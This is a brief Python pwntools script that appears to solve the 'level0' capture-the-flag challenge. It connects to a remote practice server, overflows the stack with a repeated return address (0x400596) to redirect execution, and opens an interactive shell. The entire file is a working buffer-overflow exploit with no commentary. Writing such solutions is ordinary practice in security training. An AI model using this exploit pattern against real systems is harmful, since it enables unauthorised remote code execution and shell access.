from pwn import *
#context.log_level = 'debug'

#cn = process('./level0')
cn = remote('pwn2.jarvisoj.com',9881)

cn.send(p64(0x0000000000400596)*30)

print len(p64(1)*30)
cn.interactive()
